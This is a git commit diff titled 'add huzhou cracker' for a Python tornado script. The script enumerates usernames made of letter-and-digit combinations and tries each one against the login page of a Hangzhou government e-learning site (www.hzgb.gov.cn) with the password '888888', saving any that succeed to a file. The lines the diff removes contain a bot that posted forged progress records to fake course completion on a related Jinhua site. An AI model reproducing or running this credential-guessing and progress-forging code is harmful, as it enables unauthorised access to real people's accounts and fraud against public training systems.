dc07c6efcb6ccce57f8878647076abf56013f6af
Yuzo <hyzgog@gmail.com>
2016-03-27 03:30:41 +0800

    add huzhou cracker

--- killer.py
+++ killer.py
@@ -1,85 +1,58 @@
-import signal
+import sys
+import string
 import logging
-import time
-import json
+from itertools import product
 from tornado.gen import coroutine, sleep
 from tornado.ioloop import IOLoop
 from tornado.queues import Queue
 from tornado.httpclient import AsyncHTTPClient
 from lessonrobot import LessonRobot
 
+q = Queue()
 concurrency = 10
-q = Queue(maxsize=1000)
-
+filename = 'char_%s_digit_%s.txt' % (sys.argv[1], sys.argv[2])
 logging.basicConfig(format="%(asctime)s: %(message)s", level=logging.INFO)
-AsyncHTTPClient.configure(None, max_clients=1000)
+logging.info(filename)
 
-spawn_timestamp = time.time()
-exception_timestamp = time.time()
+def gen_char(n):
+	for comb in product(string.ascii_lowercase, repeat=n):
+		yield ''.join(comb)
+
+def gen_digit(n):
+	for comb in product(string.digits, repeat=n):
+		yield ''.join(comb)
 
 @coroutine
 def worker():
-	global concurrency, spawn_timestamp, exception_timestamp
 	while True:
 		username = yield q.get()
-		logging.info('[Get] %s' % username)
 
 		try:
 			robot = LessonRobot()
-			result = yield robot.login(username, '123456')
+			result = yield robot.login(username, '888888')
 			if result:
 				logging.info('[Login] %s' % username)
-				count = yield robot.page_count()
-				for i in xrange(1, count + 1):
-					course_list = yield robot.page(i)
-					course_len = len(course_list)
-					logging.info('[Page] %s: %d/%d => %d' % (username, i, count, course_len))
-					for course in course_list:
-						logging.info('[Learn] %s: %s' % (username, course))
-						yield robot.learn(course)
-					now_timestamp = time.time()
-					if now_timestamp - exception_timestamp > 60 and now_timestamp - spawn_timestamp > 60:
-						concurrency += 1
-						IOLoop.current().spawn_callback(worker)
-						spawn_timestamp = now_timestamp
-						logging.info('[Spawn] concurrency = %d' % concurrency)
-				logging.info('[Done] %s' % username)
+
+				with open(filename, 'w') as fout:
+					fout.write(username)
 			else:
 				logging.info('[Failed] %s' % username)
 		except Exception as e:
 			logging.info('[Exception] %s:%s' % (username, e))
 			yield q.put(username)
 
-			last_timestamp = exception_timestamp
-			exception_timestamp = time.time()
-			if exception_timestamp - last_timestamp < 10:
-				if concurrency > 1:
-					q.task_done()
-					concurrency -= 1
-					logging.info('[Reduce] concurrency = %d' % concurrency)
-					break
-				else:
-					yield sleep(60)
-
 		q.task_done()
 
 @coroutine
 def spawner():
-	accounts = []
-	with open('accounts.json') as accounts_file:
-		accounts = json.loads(accounts_file.read())
-	for username in accounts:
-		yield q.put(username)
-		logging.info('[Put] %s' % username)
-		yield sleep(1)
+	iter_char = gen_char(int(sys.argv[1]))
+	iter_digit = gen_digit(int(sys.argv[2]))
 
-def handler_USR1(signum, frame):
-	global concurrency
-	concurrency += 1
-	logging.info('[Signal] %d: concurrency = %d' % (signum, concurrency))
-	IOLoop.current().spawn_callback(worker)
-
-signal.signal(signal.SIGUSR1, handler_USR1)
+	for char in iter_char:
+		for digit in iter_digit:
+			username = char + digit
+			yield q.put(username)
+			yield sleep(0.001)
 
 @coroutine
 def main():
--- lessonrobot.py
+++ lessonrobot.py
@@ -1,30 +1,23 @@
 # -*- Mode: Python; coding: utf-8; indent-tabs-mode: t; c-basic-offset: 4; tab-width: 4 -*-
 
-import os
-import re
 import string
-import subprocess
-from Cookie import SimpleCookie
-from datetime import datetime, timedelta
 from pyquery import PyQuery
-from random import randrange
 from urllib import urlencode
-from urlparse import parse_qs, urlparse
 
 from fake_useragent import UserAgent
 from tornado.gen import coroutine, sleep, Return
 from tornado.httpclient import AsyncHTTPClient, HTTPError
 
 class LessonRobot(object):
-	referer_url = 'http://jhce.jhxf.gov.cn'
-	login_url = 'http://jhce.jhxf.gov.cn/login.aspx?from=changeuser'
-	kick_url = 'http://jhce.jhxf.gov.cn/Login.aspx?Kick=True&UserId='
-	course_list_url = 'http://jhce.jhxf.gov.cn/Course/Default.aspx'
-	my_url = 'http://jhce.jhxf.gov.cn/my/Default.aspx'
-	course_url = 'http://jhce.jhxf.gov.cn/course/Course.aspx?id='
-	play_url = 'http://jhce.jhxf.gov.cn/play/play.aspx?course_id='
-	progress_url = 'http://jhce.jhxf.gov.cn/play/AICCProgressNew.ashx'
-	redirect_url = 'http://jhce.jhxf.gov.cn/play/redirect.aspx'
+	referer_url = 'http://www.hzgb.gov.cn'
+	login_url = 'http://www.hzgb.gov.cn/login.aspx?from=changeuser'
+	kick_url = 'http://www.hzgb.gov.cn/Login.aspx?Kick=True&UserId='
+	course_list_url = 'http://www.hzgb.gov.cn/Course/Default.aspx'
+	my_url = 'http://www.hzgb.gov.cn/my/Default.aspx'
+	course_url = 'http://www.hzgb.gov.cn/course/Course.aspx?id='
+	play_url = 'http://www.hzgb.gov.cn/play/play.aspx?course_id='
+	progress_url = 'http://www.hzgb.gov.cn/play/AICCProgressNew.ashx'
+	redirect_url = 'http://www.hzgb.gov.cn/play/redirect.aspx'
 
 	def __init__(self):
 		super(LessonRobot, self).__init__()
@@ -33,20 +26,14 @@ class LessonRobot(object):
 			'User-Agent': UserAgent().random,
 			'Referer': self.referer_url
 		}
-		self.cookiejar = SimpleCookie()
 
 	@coroutine
 	def login(self, username, password):
-		self.username = username = username.encode('utf-8')
-
 		r = yield self.client.fetch(self.login_url, headers=self.session_header)
-		for c in r.headers.get_list('Set-Cookie'):
-			self.cookiejar.load(c)
-		self.load_cookie()
-
 		d = PyQuery(r.body.decode('utf-8', 'ignore'))
 		body = {
 			"__VIEWSTATE": d('#__VIEWSTATE').attr('value'),
+			"__VIEWSTATEGENERATOR": d('__VIEWSTATEGENERATOR').attr('value'),
 			"__EVENTVALIDATION": d('#__EVENTVALIDATION').attr('value'),
 			"ctl00$cp$Login1$UserName": username,
 			"ctl00$cp$Login1$Password": password,
@@ -55,138 +42,9 @@ class LessonRobot(object):
 
 		try:
 			r = yield self.client.fetch(self.login_url, method='POST', headers=self.session_header, body=urlencode(body), follow_redirects=False)
-			if 'Set-Cookie' in r.headers:
-				try:
-					r = yield self.client.fetch(self.kick_url + str(username), headers=self.session_header, follow_redirects=False)
-				except HTTPError as e:
-					r = e.response
-				for c in r.headers.get_list('Set-Cookie'):
-					self.cookiejar.load(c)
-				self.load_cookie()
+			raise Return(False)
+		except HTTPError as e:
+			if e.code == 302:
 				raise Return(True)
 			else:
-				raise Return(False)
-		except HTTPError as e:
-			r = e.response
-			for c in r.headers.get_list('Set-Cookie'):
-				self.cookiejar.load(c)
-			self.load_cookie()
-			raise Return(True)
-
-	def load_cookie(self):
-		self.session_header['Cookie'] = '; '.join(["%s=%s" % (k, v.value) for k, v in self.cookiejar.iteritems()])
-
-	@coroutine
-	def page_count(self):
-		r = yield self.client.fetch(self.course_list_url, headers=self.session_header)
-
-		d = PyQuery(r.body.decode('utf-8', 'ignore'))
-		href = d('a.pagesPP').eq(11).attr('href')
-		pattern =  r"'(\d*)'"
-		count = int(re.search(pattern, href).groups(1)[0])
-
-		raise Return(count)
-
-	@coroutine
-	def page(self, page):
-		course_table = {}
-
-		def extract_list(i, e):
-			if i > 0:
-				d = PyQuery(e)
-				courseID = int(parse_qs(urlparse(d('a').attr('href')).query)['id'][0])
-				status = d('td').eq(-2).text()
-				if status == u'已选':
-					status = 2
-				elif status == u'点击进入':
-					status = 0
-				course_table[courseID] = status
-
-		def extract_my(i, e):
-			d = PyQuery(e)
-			courseID = int(parse_qs(urlparse(d('a').attr('href')).query)['id'][0])
-			if courseID in course_table:
-				course_table[courseID] = 1
-
-		first_res, my_res = yield [self.client.fetch(self.course_list_url, headers=self.session_header), self.client.fetch(self.my_url, headers=self.session_header)]
-		d = PyQuery(first_res.body.decode('utf-8', 'ignore'))
-
-		#request later page
-		if page != 1:
-			body = {
-				'__EVENTTARGET': 'ctl00$ctl00$ctl00$cp$cp$cp$AspNetPager1',
-				'__EVENTARGUMENT': page,
-				'__VIEWSTATE': d('#__VIEWSTATE').attr('value'),
-				'__EVENTVALIDATION': d('#__EVENTVALIDATION').attr('value')
-			}
-			page_res = yield self.client.fetch(self.course_list_url, method='POST', headers=self.session_header, body=urlencode(body))
-			d = PyQuery(page_res.body.decode('utf-8', 'ignore'))
-
-		#extract_list
-		d('#ctl00_ctl00_ctl00_cp_cp_cp_gvCourse tr').each(extract_list)
-
-		#process myCourse at last
-		d = PyQuery(my_res.body.decode('utf-8', 'ignore'))
-		d('table.table').eq(0).find('tr.table2').each(extract_my)
-
-		course_list = [name for name, value in course_table.iteritems() if value != 2]
-		raise Return(course_list)
-
-	@coroutine
-	def learn(self, courseID):
-		#register
-		r = yield self.client.fetch(self.course_list_url, headers=self.session_header)
-		d = PyQuery(r.body.decode('utf-8', 'ignore'))
-
-		query = {
-			'id': courseID,
-			'user_id': self.username
-		}
-
-		try:
-			r = yield self.client.fetch(self.redirect_url + '?' + urlencode(query), headers=self.session_header, follow_redirects=False)
-		except HTTPError as e:
-			pass
-
-		#get username, sid_list and start play
-		r, _ = yield [self.client.fetch(self.course_url + str(courseID), headers=self.session_header), self.client.fetch(self.play_url + str(courseID), headers=self.session_header)]
-		d = PyQuery(r.body.decode('utf-8', 'ignore'))
-
-		sid_list = d('table.table td[colspan="3"] td:last-child').text().split(' ')
-
-		#initParam
-		body = {
-			"method": "initParam",
-			"courseID": courseID,
-			"userID": self.username
-		}
-		yield self.client.fetch(self.progress_url, method='POST', headers=self.session_header, body=urlencode(body))
-
-		for sid in sid_list:
-			if 'S' in sid:
-				#start one
-				body = {
-					'method': 'setParam',
-					'lastLocation': 0,
-					'SID': sid,
-					'curtime': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-					'STime': 1,
-					'state': 'S',
-					'courseID': courseID,
-					'userID': self.username
-				}
-				yield self.client.fetch(self.progress_url, method='POST', headers=self.session_header, body=urlencode(body))
-				yield sleep(1)
-
-				#finish one
-				body = {
-					'method': 'setParam',
-					'lastLocation': 10050,
-					'SID': sid,
-					'curtime': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-					'STime': 1,
-					'state': 'C',
-					'courseID': courseID,
-					'userID': self.username
-				}
-				yield self.client.fetch(self.progress_url, method='POST', headers=self.session_header, body=urlencode(body))
+				raise e
